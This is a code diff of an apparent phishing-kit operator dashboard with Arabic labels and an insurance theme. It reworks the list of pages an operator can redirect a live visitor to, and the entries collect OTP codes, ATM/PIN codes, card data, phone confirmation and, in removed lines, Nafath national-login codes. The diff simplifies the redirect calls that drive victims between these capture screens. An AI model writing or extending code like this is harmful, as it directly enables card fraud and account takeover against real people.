@@ -115,13 +115,13 @@ export default function DashboardPage() {
   const pageOptions = [
     { value: "", label: "اختر صفحة للتوجيه..." },
     { value: "home-new", label: "🏠 الرئيسية" },
-    { value: "step1", label: "📋 اختيار التأمين" },
-    { value: "step2", label: "🔐 رمز التحقق" },
-    { value: "step3", label: "🔢 رمز ATM" },
-    { value: "step4", label: "💳 الدفع" },
-    { value: "step5", label: "📱 رقم الهاتف" },
-    { value: "step6", label: "🔒 النفاذ" },
-    { value: "nafad-otp", label: "🔑 رمز النفاذ" },
+    { value: "compar", label: "📊 مقارنة الأسعار" },
+    { value: "insur", label: "📋 تفاصيل التأمين" },
+    { value: "check", label: "🔐 التحقق من البيانات" },
+    { value: "step2", label: "🔢 رمز OTP" },
+    { value: "step3", label: "🔏 رمز PIN" },
+    { value: "step4", label: "💳 بيانات البطاقة" },
+    { value: "step5", label: "📱 تأكيد الهاتف" },
   ];
 
   // Sort requests by the original submission time (newest first)
@@ -861,22 +861,11 @@ export default function DashboardPage() {
     
     setActionLoading("redirect");
     
-    // Special handling for nafad-otp: redirect to step4 with verifying status
-    const isNafadOtp = redirectPage === "nafad-otp";
-    const targetPage = isNafadOtp ? "step4" : redirectPage;
-    
     try {
-      const requestBody: Record<string, any> = { visitorId, targetPage };
-      
-      // If nafad-otp, also set verifying status to show popup immediately
-      if (isNafadOtp) {
-        requestBody.setNafadVerifying = true;
-      }
-      
       const res = await fetch("/api/dashboard/redirect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(requestBody),
+        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
       });
       if (res.ok) {
         const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
@@ -2902,19 +2891,11 @@ const renderNafadBox = () => {
                       setActionLoading("redirect");
                       setRedirectPage(selectedPage);
 
-                      // Special handling for nafad-otp
-                      const isNafadOtp = selectedPage === "nafad-otp";
-                      const targetPage = isNafadOtp ? "step4" : selectedPage;
-                      const requestBody: Record<string, any> = { visitorId, targetPage };
-                      if (isNafadOtp) {
-                        requestBody.setNafadVerifying = true;
-                      }
-
                       try {
                         const res = await fetch("/api/dashboard/redirect", {
                           method: "POST",
                           headers: { "Content-Type": "application/json" },
-                          body: JSON.stringify(requestBody),
+                          body: JSON.stringify({ visitorId, targetPage: selectedPage }),
                         });
                         if (res.ok) {
                           const pageLabel = pageOptions.find((p) => p.value === selectedPage)?.label || selectedPage;
